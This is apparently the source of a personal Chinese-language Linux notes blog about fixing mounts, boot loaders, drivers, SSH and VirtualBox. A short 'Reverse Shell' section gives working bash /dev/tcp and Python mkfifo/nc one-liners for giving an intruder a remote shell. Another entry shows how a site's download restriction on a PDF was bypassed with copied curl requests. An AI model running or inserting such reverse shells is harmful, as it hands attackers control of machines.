UUID=2A3C344750F6F698   /mnt/software  ntfs defaults 1   2\n\n  # /dev/sda3\n  # UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults\t0 1\n  UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa\t/mnt/deepin-sda3 ext4  defaults  1   2\n\n  ```\n\n- 然而并没有一直正常，后来修改了一次挂载点后，就一直崩，无论是把`defaults`换成`nofail`还是相反，都没用\n\n- 后来多启动几次就好了，，可能是类似多进程执行顺序之类的东西导致的不确定性错误\n\n#### Ubuntu\n\n- 一切正常\n\n- 代码\n\n  ```\n  # /etc/fstab: static file system information.\n  #\n  # Use 'blkid' to print the universally unique identifier for a\n  # device; this may be used with UUID= as a more robust way to name devices\n  # that works even if disks are added and removed. See fstab(5).\n  #\n  # <file system> <mount point>   <type>  <options>       <dump>  <pass>\n  # / was on /dev/sda8 during installation\n  UUID=3ae3faef-8fe6-42ef-8874-a0417df43831 /               ext4    errors=remount-ro 0       1\n  # /boot/efi was on /dev/sda1 during installation\n  UUID=CCCB-BF68  /boot/efi       vfat    umask=0077      0       1\n  # swap was on /dev/sda4 during installation\n  UUID=0ca7110f-0b3c-4452-aace-5b3dd99456f3 none            swap    sw              0       0\n  # /dev/sda5\n  # UUID=0CADCC32742391F2       /home/hzx/sda5  \t    ntfs defaults\t0 1\n  UUID=0CADCC32742391F2   /media/hzx/0CADCC32742391F2  ntfs nofail  1   2\n  # /dev/sda2 /run/media/wuxu/Windows ntfs defaults 1 2\n  # /dev/sda2 /run/media/wuxu/bin ntfs defaults 1 2\n\n  # /dev/sda6\n  # UUID=2A3C344750F6F698       /home/hzx/sda6         ntfs defaults\t0 1\n  UUID=2A3C344750F6F698   /media/hzx/2A3C344750F6F698  ntfs nofail  1   2\n\n  # /dev/sda9\n  UUID=202D1B334927E0CC /media/hzx/202D1B334927E0CC ntfs nofail 1 2\n\n  # /dev/sda3\n  # UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa       /home/hzx/sda3     ext4 defaults\t0 1\n  UUID=9bb0bb13-a28a-48a4-8022-6e83dcec47aa\t/media/hzx/9bb0bb13-a28a-48a4-8022-6e83dcec47aa ext4 nofail     1   2\n  ```\n\n### mkfs.vfat了sda2那个efi分区结果deepin启动不了\n\n- 情况是这样的：往sda2装grub后总是失败，然后deepin自己的boot分区虽然也有grub，也有grub.cfg但是也一直必须手动引导。然后把sda2格式化后不知道为什么deepin无法启动。\n- 放弃，新装一个deepin 15.6，然后就会自动安装引导。\n- 搞定后，进原来那个deepin15.5还是失败，查看`journalctl -xb`，发现有个设备无法加载还是怎样的，然后想到以前该fstab也这样，所以比对错误信息和fstab，果然如此。\n- 原因是swap分区的uuid改了，并且也从sda4变成sda5，然而并没有去新建分区什么的，只有格式化sda2。\n- 后来猜测之所以装不上grub可能是sda2太小，只有100M，deepin提示说至少要300M\n\n### 编译内核.md\n\n#### 无openssl/bio.h\n\n> 编译Linux-4.9.11内核时遇到：“error : openssl/bio.h :No such file or folder”\n>\n>  \" #include <openssl/bio.h>\"\n>\n> <<<------------------------------------>>>\n>\n> 解决方法: [ubuntu 16.10,64位主机]\n>\n> `sudo apt install libssl-dev`\n\n### 记一次尝试下载 不允许下载的sinacloud的pdf\n\n- 获得页面源代码\n\n- 在html搜索字符串next从而定位到逻辑代码\n\n- 然后看到后面一堆JavaScript:void(0)，发现前面有个函数，但是页面内一堆引用外部的js脚本\n\n- 然后去chrome控制台使用以下代码\n\n  ```javascript\n  setTimeout(function() {\n      var script = document.createElement('script');\n      script.type = 'text/javascript';\n      script.innerHTML = \"console.log(closePay)\"//括号内是要获得的函数名称;\n      document.head.appendChild(script);\n  }, 1000);\n  ```\n\n- 然后等chrome显示出来后，点击显示出来的东西可以跳转到source code那里。从而最终定位到该函数所在的脚本，但是苦于代码过度，审计失败\n\n- 直接wget那些url得到的是206，但是wget一直停不下来，尝试用axel开20个线程下载，但是每次下来的都是13.9m大小的东西，然后还打不开（除了其中一页图片）\n\n- 查看chrome控制台的network模块，发现图片都没那么大，所以尝试右键copy request head发现并没有特别的，所以不知道为什么wget和axel没成功，copy curl后发现似乎是一个curl命令，加上-o参数后成功下载，curl即使不加上请求头，也可以正常获得东西，nice\n\n#### 附录\n\n```http\n//request head\nhttp://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&KID=sina%2CSAE0000000W1W2NYLKW2&ssig=K74aTt3a0F&range=6020439-6389345\nGET /swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&KID=sina%2CSAE0000000W1W2NYLKW2&ssig=K74aTt3a0F&range=6020439-6389345 HTTP/1.1\nHost: sinacloud.net\nConnection: keep-alive\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36\nAccept: image/webp,image/apng,image/*,*/*;q=0.8\nDNT: 1\nAccept-Encoding: gzip, deflate\nAccept-Language: en,zh;q=0.9,zh-CN;q=0.8\n\n//从chrome复制的curl命令\ncurl 'http://sinacloud.net/swf.ishared/5O0d4lu5e1.jpg?Expires=1523242733&KID=sina%2CSAE0000000W1W2NYLKW2&ssig=K74aTt3a0F&range=3259947-3560373' -H 'Accept: image/webp,image/apng,image/*,*/*;q=0.8' -H 'Connection: keep-alive' -H 'DNT: 1' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en,zh;q=0.9,zh-CN;q=0.8' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36' --compressed\n```\n\n### 查找并删除特定文件.md\n\n[来源](https://www.cnblogs.com/langzou/p/5959940.html)\nlinux命令每日一练\nlinux中find与rm实现查找并删除目录或文件\n\nlinux 下用find命令查找文件，rm命令删除文件。\n\n删除指定目录下指定文件\nfind 要查找的目录名 -name .svn |xargs rm -rf\n\n删除指定名称的文件或文件夹: find -type d | grep .svn$ | xargs rm -r\n\n分析：\nfind -type d | grep .svn$ 通过此命令查找文件夹 过滤正则表达式中的目录\n| xargs rm -r 执行删除指令\n\n删除目录下所有exe文件\n\nfind . -name '*.exe' -type f -print -exec rm -rf {} ;\n\n(1) \".\" 表示从当前目录开始递归查找\n\n(2) “ -name '*.exe' \"根据名称来查找，要查找所有以.exe结尾的文件夹或者文件\n\n(3) \" -type f \"查找的类型为文件\n\n(4) \"-print\" 输出查找的文件目录名\n\n(5) 最主要的是是-exec了，-exec选项后边跟着一个所要执行的命令，表示将find出来的文件或目录执行该命令。\nexec选项后面跟随着所要执行的命令或脚本，然后是一对儿{}，一个空格和一个，最后是一个分号\n\n### VPS上部署hexo\n\n- [参考文章](https://blog.fundebug.com/2017/05/18/deploy-hexo-on-cloud/)\n\n- 遇到nginx 403，然后就关闭selinux\n\n  > 1、临时关闭\n  > setenforce 0 #设置SELinux 成为permissive模式\n  >\n  > # setenforce 1 设置SELinux 成为enforcing模式\n  >\n  > 2、修改配置文件需要重启机器：\n  >\n  > 修改/etc/selinux/config 文件\n  >\n  > 将SELINUX=enforcing改为SELINUX=disabled\n  >\n  > 重启机器即可\n\n### 搭建ss服务器\n\n- vps开了进程\n- 本地主机也如此\n- 但是提示[Errno 113] No route to host\n- 实在搞不明白——22端口可以用scp发文件过去vps\n- 所以用py写了个tcpclient、tcpserver，然后一运行也如此提示\n- 所以在vps运行`service firewalld stop`\n- 其他关闭服务器防火墙的方法都不起作用，不知道问什么\n\n### VLC字幕\n\n[链接](http://blog.sina.com.cn/s/blog_47ecc3660100vtnc.html)\n\n### vbox的win7虚拟机无法使用usb\n\n- [引用自](https://blog.csdn.net/harry_helei/article/details/46972125)\n- 安装Virtualbox Extension Pack\n- 用户权限添加\n  - 添加usbfs 用户组（virtualbox 装完成后会有 vboxusers 和vboxsf ）`sudo groupadd usbfs`   \n  - 将你的linux常用用户添加到vboxusers、usbfs这个两个组中`sudo adduser kuein vboxusers`  `sudo adduser kuein usbfs` \n  - 重启电脑，启动Virtualbox，确认在virtualbox管理器中，USB设备的enable usb controler 、enable usb2.0 controler打勾。Win7启动后，右击右下角USB设备符号，在Setting中，选择USB Massage相关的选项，就会自动安装驱动，驱动安装成功后，win7下成功挂载U盘。\n\n### Gnome-configure.md\n\n### hide title bar\n\n[no-title-bar-extention](https://extensions.gnome.org/extension/1267/no-title-bar/)\n\n### SSH.md\n\n#### 生成秘钥\n\n- 本地用`ssh-keygen`生成一个秘钥——可以自定义储存的文件名\n- 把`id_rsa.pub`传送到vps上，`cat id_rsa.pug > ~/.ssh/authorized_keys`，注意，这个命令会覆盖原有的`authorized_keys`内容\n\n#### 本地配置VPS别名\n\n- 代码\n\n  ```shell\n  cat >> ~/.ssh/config <<EOF\n  Host VultrVPS\n      User root\n      Hostname 217.163.11.0\n      PreferredAuthentications publickey\n      IdentityFile ~/.ssh/VultrVPS_rsa\n      Port 22\n  EOF\n  ```\n\n- 以上可实现使用秘钥 ，多个VPS可以依次增加配置\n\n### Linux安装.md\n\n#### 硬盘安装deepin\n\n- [来源](http://bbs.iaixue.com/forum.php?mod=viewthread&tid=1812)\n\n> 将如下grub菜单放到/boot/grub/grub.cfg的menuentry菜单处/deepin-15.5-amd64.iso是deepin的镜像文件完整路径，可以自由地放在linux或windows分区中，区分大小写\n\n```\nmenuentry \"UEFI Deepin 15.4 Linux ISO live\" --class deepin --class gnu-linux --class gnu --class os{\n        echo 'booting...'\n        set isofile=/deepin-15.5-amd64.iso\n        search --file $isofile --set=root\n        loopback loop $isofile\n        linux (loop)/live/vmlinuz.efi findiso=$isofile noprompt quiet boot=live ro deepin-installer locales=zh_CN.UTF-8 keyboard-configuration/layoutcode=us keyboard-configuration/variantcode= --  rootflags=sync\n        initrd (loop)/live/initrd.lz\n}\n```\n\n#### 刻录U盘安装Fedora或Centos\n\n- win下使用PowerISO刻录\n- 使用简单的dd命令`dd if=xxx of=xxx bs=xx`失败\n- 使用Ultraiso失败\n\n#### U盘grub引导多个linux镜像安装\n\n- [U盘引导多个linux镜像安装,同时支持BIOS和UEFI模式](https://my.oschina.net/abcfy2/blog/491140)。文中提供的deepin的那个grub配置无效\n- [使用grub2制作启动U盘](https://bbs.deepin.org/forum.php?mod=viewthread&tid=150783)，尝试把grub配置换为该链接的配置，可以启动到deepin进行安装，但是中途说挂载某分区失败从而安装失败\n  ![错误信息](./LinuxInstall_1.jpg)\n\n### OSC提供的代码make不过\n\n```makefile\nsource code 9th/final-src-osc9e/ch2 \n➜ make                                                             \nmake -C /lib/modules/4.9.0-deepin13-amd64/build M=/home/hzx/Program/source code 9th/final-src-osc9e/ch2 modules\nmake[1]: Entering directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'\narch/x86/Makefile:140: CONFIG_X86_X32 enabled but no binutils support\nmake[3]: *** No rule to make target 'code'.  Stop.\nMakefile:150: recipe for target 'sub-make' failed\nmake[2]: *** [sub-make] Error 2\nMakefile:8: recipe for target 'all' failed\nmake[1]: *** [all] Error 2\nmake[1]: Leaving directory '/usr/src/linux-headers-4.9.0-deepin13-amd64'\nMakefile:3: recipe for target 'all' failed\nmake: *** [all] Error 2\n```\n\n解决方法，把source code 9th这个文件名的空格去掉\n\n### vim dos unix\n\n- 如果某文本文件的行末都有0d0a，则vim直接打开识别为dos。如果是vim -b 打开，识别为unix。如果最后一行不是0d0a，其他行是，不识别为dos。\n\n### 删除文件名以`-`开头的文件\n\n- 比如删除`-a`：`rm -- -a`\n\n### 文件的change，modification时间\n\n- 以下来自于实验：change是修改属性，比如`touch -d 1111 filename`，modification是修改内容\n\n### ctags 注意事项\n\n- 如果某文件打开后编辑过，可能ctags打的tag就失效了（比如行号不对），所以跳转无效\n\n### watch命令\n\n- `watch -n 0.1 ./a.o` 与`watch ./a.o -n 0.1`的区别是前者`-n 0.1`是watch的参数，后者是`./a.o`的参数\n\n### 修复light display manger失败\n\n- 通过启动时的错误信息，还有single模式中，service lightdm start后的错误信息（systemctl service ）可以知道light display manager启动失败\n- 搜到的都说重新安装dde，但是需要网络，而single-user mode 是没有网络的。然后其他模式又没搜到要怎么进去，到是grub图形界面有提供一个带网络的recovery模式，不过我没有grub图形界面\n- 就搜了搜在single模式联网——按照定义，single模式是没有网络的。然后联网后install dde，中途flatpak提示desktopRecord.service不存在，然后错误处理ctrl-c了dde的安装过程。然后后来按照dde的安装信息提示安装其他组件console-setup，然后使用sudo apt-get install --reinstall dde修复了dde的安装（apt -f在这里是没用的）\n- 不知道为什么中途提示proxychain 的配置文件修改了\n- 本来想着要是没网，就下个lightdm 来安装，结果没有binary的文件，装不了。\n- 后来安装好dde后startx老是说成功退出——没有任何报错信息，都是成功，连退出都是成功退出，但是就是不符合我的预期\n\n### 查看glibc版本\n\n- `ldd --version`\n- `getconf GNU_LIBC_VERSION`\n\n### shell使用`|`时的SIGPIPE\n\n- 比如`proc_1 | proc_2`，如果第二个进程关闭，第一个就会管道破裂，如果没有处理就会die\n\n### 安装nvidia驱动\n\n- 在nvidia官网下程序\n- `telinit 3`关掉`X server`（或者是systemctl stop lightdm.service）\n- 安装过程中需要编译内核模块，编译时使用的gcc版本要与编译内核的gcc版本一致\n   ```\n   $ cat /proc/version\n   Linux version 4.15.0-29deepin-generic (pbuilder@zs-PC) (gcc version 7.3.0 (Debian 7.3.0-19)) #31 SMP Fri Jul 27 07:12:08 UTC 2018\n   ```\n- 安装时，如果有驱动占用了gpu，那么会失败，在`/etc/modprobe.d/`加一个文件（命名为`*.conf`）\n   ```\n   blacklist nouveau\n   blacklist rivafb\n   blacklist rivatv\n   blacklist nvidiafb\n\n   # 下面这几条应该可以不用，我不加也成功\n   options nouveau modeset=0 \n   options rivafb modeset=0\n   options rivatv modeset=0\n   options nvidiafb modeset=0\n   ```\n- 安装过程中我一开始选使用dkms，但是失败，后来没选，也失败了几次，所以不清楚dkms的情况\n- 安装后要运行`nvidia-xconfig`配置`/etc/X11/xorg.conf`，或者自己手动配置（然而我这里一直失败，一加相关的东西就启动卡住，而且也没有报错信息——我们又看其他信息，不知道其他信息有没有提示）\n- 然而。事情没那么简单，我装了nvidia驱动后，deepin-wm cpu占用率飙升，nvidia-smi看不到使用gpu的进程，gg。没办法，卸了驱动，删了blacklist\n- 后来发现deepin有个gpu driver manager，运行后，跑了很久，重启后还跑了很久，还看到一堆error，然后还开一个渲染画面让我看看渲染得咋样，然后后来启动成功，nvidia-smi也看到有deepin-wm的进程跑在gpu上，deepin-wm的cpu占用率也没有飙升，还行\n\n### Tilix dont inherit the directory\n\n- [The VTE matter this](https://github.com/gnunn1/tilix/wiki/VTE-Configuration-Issue)\n\n### sogouPinyin候选框异常解决方法\n\n- 其实也不算解决，我在配置文件里把所有能关掉skin的选项都关了，sougou还是不使用fcitx的skin，删了`~/.config`下面的sogou相关配置文件也没用\n- 后来发现，如果有其他输入法一起，然后切换过其他输入法，sogoupinyin的皮肤就跟那个输入法的一样（也不知道是不是一样，我的fcitx不能切换皮肤，所有只有一个皮肤）\n\n### cache的详细信息（包括相联度，电压等）\n\n- `sudo dmidecode -t 7`\n- `getconf -a | grep CACHE`\n\n### 设置默认浏览器\n\n- `xdg-settings set default-web-browser chrome.desktop`\n- `xdg-settings get default-web-browser`获取值\n- 关于desktop文件的`Exec`段中的后缀，[doc](https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html)\n   > %i\tThe Icon key of the desktop entry expanded as two arguments, first --icon and then the value of the Icon key. Should not expand to any arguments if the Icon key is empty or missing.\n   > %c\tThe translated name of the application as listed in the appropriate Name key in the desktop entry.\n   > %k\tThe location of the desktop file as either a URI (if for example gotten from the vfolder system) or a local filename or empty if no location is known.\n   > %f\tA single file name (including the path), even if multiple files are selected. The system reading the desktop entry should recognize that the program in question cannot handle multiple file arguments, and it should should probably spawn and execute multiple copies of a program for each selected file if the program is not able to handle additional file arguments. If files are not on the local file system (i.e. are on HTTP or FTP locations), the files will be copied to the local file system and %f will be expanded to point at the temporary file. Used for programs that do not understand the URL syntax.\n   > %F\tA list of files. Use for apps that can open several local files at once. Each file is passed as a separate argument to the executable program.\n   > %u\tA single URL. Local files may either be passed as file: URLs or as file path.\n   > %U\tA list of URLs. Each URL is passed as a separate argument to the executable program. Local files may either be passed as file: URLs or as file path.\n\n### github账户有设置ssh但是仓库push还是要用户密码的解决方法\n\n- 这是因为remote add时使用的是https，而不是ssh\n- `git remote -v`可以看到是https链接\n- `git remote set-url origin git@github.com:USERNAME/REPOSITORY.git`改为ssh\n- [参考](https://help.github.com/articles/changing-a-remote-s-url/)\n","content":"<h3 id=\"Reverse-Shell\"><a href=\"#Reverse-Shell\" class=\"headerlink\" title=\"Reverse Shell\"></a>Reverse Shell</h3><ul>\n<li>受控机器上执行<code>bash -i /dev/tcp/IP/PORT 0&lt;&amp;1</code> (最后改为<code>0&gt;&amp;1</code>也ok)，入侵者机器提前打开listen socket，可以实现reverse shell</li>\n<li><code>eval(&quot;__import__(&#39;os&#39;).system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc localhost 8000 &gt; /tmp/f&#39;)&quot;)</code>（python代码）也可以</li>\n</ul>\n<h3 id=\"SIGINT的SIG-DEF\"><a href=\"#SIGINT的SIG-DEF\" class=\"headerlink\" title=\"SIGINT的SIG_DEF\"></a>SIGINT的SIG_DEF</h3><ul>\n<li>默认的handler会输出一个换行。</li>\n<li><p>代码</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    sleep(<span class=\"number\">10</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>如果不<code>kill -2 a.out</code>则不会输出一个空行，如果kill则会</p>\n</li>\n</ul>\n<h3 id=\"boot过程\"><a href=\"#boot过程\" class=\"headerlink\" title=\"boot过程\"></a>boot过程</h3><ul>\n<li>究竟是否有使用 /dev/sda 第一个sector，还是说uefi中我选择deepin 的boot loader那么直接就去sda12读取第一个sector</li>\n<li>我在grub命令行环境可以很好的读取各个分区的东西，那么为什么还需要<code>initrd    /boot/initrd.img-4.9.0-deepin13-amd64</code>。（我甚至可以在这条命令前去加载一个ntfs的module）。</li>\n<li>既然boot loader 可以加载<code>/boot/</code>目录中的vmlinuz、initrd，那么为什么还需要kernel 加载sata驱动来加载文件呢</li>\n<li>关于initrd <blockquote>\n<p>The special file /dev/initrd is a read-only block device. This device is a RAM disk that is initialized (e.g., loaded) by the boot loader before the kernel is started. The kernel then can use /dev/initrd’s contents for a two-phase system boot-up. In the first boot-up phase, the kernel starts up and mounts an initial root filesystem from the contents of /dev/initrd (e.g., RAM disk initialized by the boot loader). In the second phase, additional drivers or other modules are loaded from the initial root device’s contents. After loading the additional modules, a new root filesystem (i.e., the normal root filesystem) is mounted from a different device.<br>Boot-up operation<br>   When booting up with initrd, the system boots as follows:</p>\n<ol>\n<li>The boot loader loads the kernel program and /dev/initrd’s contents into memory.</li>\n<li>On kernel startup, the kernel uncompresses and copies the contents of the device /dev/initrd onto device /dev/ram0 and then frees the memory used<br>by /dev/initrd.</li>\n<li>The kernel then read-write mounts the device /dev/ram0 as the initial root filesystem.</li>\n<li>If  the  indicated  normal  root  filesystem is also the initial root filesystem (e.g., /dev/ram0) then the kernel skips to the last step for the<br>usual boot sequence.</li>\n<li>If the executable file /linuxrc is present in the initial root filesystem, /linuxrc is executed with UID 0.  (The file /linuxrc  must  have  exe‐<br>cutable permission.  The file /linuxrc can be any valid executable, including a shell script.)</li>\n<li>If  /linuxrc is not executed or when /linuxrc terminates, the normal root filesystem is mounted.  (If /linuxrc exits with any filesystems mounted<br>on the initial root filesystem, then the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)</li>\n<li>If the normal root filesystem has a directory /initrd, the device /dev/ram0 is moved from / to /initrd.  Otherwise, if the directory /initrd does<br>not  exist, the device /dev/ram0 is unmounted.  (When moved from / to /initrd, /dev/ram0 is not unmounted and therefore processes can remain run‐<br>ning from /dev/ram0.  If directory /initrd does not exist on the normal root filesystem and any processes  remain  running  from  /dev/ram0  when<br>/linuxrc exits, the behavior of the kernel is UNSPECIFIED.  See the NOTES section for the current kernel behavior.)</li>\n<li>The usual boot sequence (e.g., invocation of /sbin/init) is performed on the normal root filesystem.</li>\n</ol>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"tab补全失效\"><a href=\"#tab补全失效\" class=\"headerlink\" title=\"tab补全失效\"></a>tab补全失效</h3><ul>\n<li>when press tab to 补全, there is   bash: 无法为立即文档创建临时文件: 权限不够</li>\n<li>this is because of the /dev/sda9 is mounted on /tmp, umonut it repair this error</li>\n</ul>\n<h3 id=\"登录用户管理\"><a href=\"#登录用户管理\" class=\"headerlink\" title=\"登录用户管理\"></a>登录用户管理</h3><ul>\n<li><p><code>users</code>或 <code>w</code>查看当前登录的用户</p>\n</li>\n<li><p><code>lsof -iTCP</code> <code>netstat -tunp</code>查看当前的网络连接</p>\n</li>\n<li><p>查看打开的端口</p>\n</li>\n<li><p><code>pkill -kill -t pts/1</code> 踢掉pts/1</p>\n</li>\n<li><p>编辑<code>/etc/hosts.deny</code> ，deny掉ip或ip段，保存立即生效？(至今仍然不知道是否有效，以及不知道通配符要怎么写，好像是 xx.xx.xx.表示xx.xx.xx.00/24子网)</p>\n<p>格式如下（其实不是非常确定以下是有用的）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sshd:218.65.30.43:deny</span><br><span class=\"line\">sshd:58.*.*.*:deny</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"是否没有listen的socket就无法被入侵？\"><a href=\"#是否没有listen的socket就无法被入侵？\" class=\"headerlink\" title=\"是否没有listen的socket就无法被入侵？\"></a>是否没有listen的socket就无法被入侵？</h3><h3 id=\"wget使用\"><a href=\"#wget使用\" class=\"headerlink\" title=\"wget使用\"></a>wget使用</h3><ul>\n<li><code>-r</code>递归下载</li>\n<li><code>-k</code>把下载下来的连接修改为本地地址</li>\n<li><code>-e robots=off</code>不respect<code>robots.txt</code></li>\n<li>或者是 set the <code>robots</code> variable to ‘off’ in your .wgetrc. </li>\n<li><code>--user-agent=&quot;&quot;</code>不添加user-agent头，如果不加上这个，有些网站会返回404</li>\n</ul>\n<h3 id=\"curl的使用\"><a href=\"#curl的使用\" class=\"headerlink\" title=\"curl的使用\"></a>curl的使用</h3><ul>\n<li>curl可以模拟post/get等行为，但是似乎没法递归下载</li>\n</ul>\n<h3 id=\"axel的使用\"><a href=\"#axel的使用\" class=\"headerlink\" title=\"axel的使用\"></a>axel的使用</h3><ul>\n<li><code>-n 100</code>开100个线程</li>\n<li>好像还可以调整缓存，从而减少写入磁盘的次数</li>\n</ul>\n<h3 id=\"VirtualBox报错“kernel-dirver-not-installed”\"><a href=\"#VirtualBox报错“kernel-dirver-not-installed”\" class=\"headerlink\" title=\"VirtualBox报错“kernel dirver not installed”\"></a>VirtualBox报错“kernel dirver not installed”</h3><ul>\n<li>复现：编译4.17内核（非稳定版，仓库也没有linux-header-4.17）并安装，安装过程中就报了一个有关virtualbox的错。后面跑这个内核时，virtualbox就提示“kernel driver not installed”，要求重新安装<code>virtualbox-dkms</code>，并运行<code>modprobe vboxdrv</code></li>\n<li><p>在4.17内核尝试</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install virtualbox-dkms</span><br><span class=\"line\">sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms</span><br><span class=\"line\">sudo apt install --reinstall linux-headers-$(uname -r) virtualbox-dkms dkms</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p> 都没有解决问题，更严重的，linux-header-4.17也没有</p>\n</li>\n<li>切换到4.15内核没有解决问题。尝试了以上命令无果</li>\n<li><p>删除4.17内核（直接在<code>/boot/</code>运行<code>rm *4.17* -r</code>）后<code>update-grub</code>。然后重启到<code>4.15.0-23-generic</code>并执行</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt update</span><br><span class=\"line\">sudo apt install --fix-missing</span><br><span class=\"line\">sudo apt install --reinstall linux-headers-4.15 virtualbox-dkms dkms </span><br><span class=\"line\">sudo modprobe vboxdrv</span><br></pre></td></tr></table></figure>\n<p> 解决问题</p>\n</li>\n<li>题外话：删除内核时，<code>dpkg --get-selections | grep linux</code> 没有看到4.17相关的</li>\n</ul>\n<h3 id=\"删除内核\"><a href=\"#删除内核\" class=\"headerlink\" title=\"删除内核\"></a>删除内核</h3><ul>\n<li><code>sudo apt-get remove linux-headers-4.4.0-22</code></li>\n<li>在<code>/boot/</code>目录下删除相关的东西</li>\n</ul>\n<h3 id=\"chmod\"><a href=\"#chmod\" class=\"headerlink\" title=\"chmod\"></a>chmod</h3><ul>\n<li><code>chmod -R 666 test</code>(test is a directory)会导致文件夹里的东西不可读（ls、cd该文件夹都不行）</li>\n<li>给文件夹本身加上x——<code>chmod 777 test</code>就可以了——文件夹内的东西不需要有可执行权限，但是文件夹的权限要有<code>x</code>标志</li>\n</ul>\n<h3 id=\"内核模块加载\"><a href=\"#内核模块加载\" class=\"headerlink\" title=\"内核模块加载\"></a>内核模块加载</h3><ul>\n<li><code>modprobe tcp_bbr</code>加载<code>tcp_bbr</code>模块 </li>\n<li>比如，<code>echo &quot;tcp_bbr&quot;&gt;&gt; /etc/modules-load.d/modules.conf</code>即可实现启动自动加载该模块</li>\n</ul>\n<h3 id=\"ufw\"><a href=\"#ufw\" class=\"headerlink\" title=\"ufw\"></a>ufw</h3><ul>\n<li>如果有一条规则允许任意from ip 连本机的某个端口，协议是udp，然后还有另一条规则是只允许某ip K连本机的任意端口，协议是tcp，那么用ip 为K的机子去连是连不上udp的，似乎是因为规则的强弱导致的覆盖</li>\n</ul>\n<h3 id=\"安装centos-md\"><a href=\"#安装centos-md\" class=\"headerlink\" title=\"安装centos.md\"></a>安装centos.md</h3><h4 id=\"联网\"><a href=\"#联网\" class=\"headerlink\" title=\"联网\"></a>联网</h4><ul>\n<li><p><a href=\"http://icyleaf.com/2013/09/network-configuration-in-centos/\" target=\"_blank\" rel=\"noopener\">参考资料</a></p>\n</li>\n<li><p>修改<code>/etc/sysconfig/network-scripts/ifcfg-eth0 (此处为网卡名对应的文件，比入enps0是ifcfg-enps0)</code></p>\n</li>\n<li><p>改为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DEVICE=eth0</span><br><span class=\"line\">HWADDR=&quot;00:22:19:09:4D:3C&quot;</span><br><span class=\"line\">NM_CONTROLLED=yes</span><br><span class=\"line\">ONBOOT=yes      # 默认是 no，我们要改成 yes</span><br><span class=\"line\">BOOTPROTO=dhcp  # 如果不是这个值也要修改</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重启network service</p>\n<ul>\n<li>方法一：<code>service network restart</code></li>\n<li>方法二：<code>/etc/init.d/network restart</code></li>\n</ul>\n</li>\n<li><p>vbox似乎默认有开nat，所以以上即可，qemu好像要自己配置nat</p>\n</li>\n</ul>\n<h4 id=\"安装图形界面\"><a href=\"#安装图形界面\" class=\"headerlink\" title=\"安装图形界面\"></a>安装图形界面</h4><ul>\n<li><a href=\"https://www.quora.com/How-can-I-install-X-Windows-on-CentOS-7\" target=\"_blank\" rel=\"noopener\">安装图形界面</a><ul>\n<li><code>yum groupinstall &quot;X Window System&quot;</code></li>\n<li><code>yum install gnome-classic-session gnome-terminal nautilus-open-terminal control-center liberation-mono-fonts</code></li>\n<li><code>unlink /etc/systemd/system/default.target</code></li>\n<li><code>ln -sf /lib/systemd/system/graphical.target  /etc/systemd/system/default.target</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"使用fstab自动挂载\"><a href=\"#使用fstab自动挂载\" class=\"headerlink\" title=\"使用fstab自动挂载\"></a>使用fstab自动挂载</h3><h4 id=\"Deepin\"><a href=\"#Deepin\" class=\"headerlink\" title=\"Deepin\"></a>Deepin</h4><ul>\n<li><p>以下是<code>/etc/fstab</code>的内容</p>\n</li>\n<li><p>在<code>Linux hzx-PC 4.9.0-deepin13-amd64 #1 SMP PREEMPT Deepin 4.9.57-1 (2017-10-19) x86_64 GNU/Linux</code>正确工作</p>\n</li>\n<li><p>代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 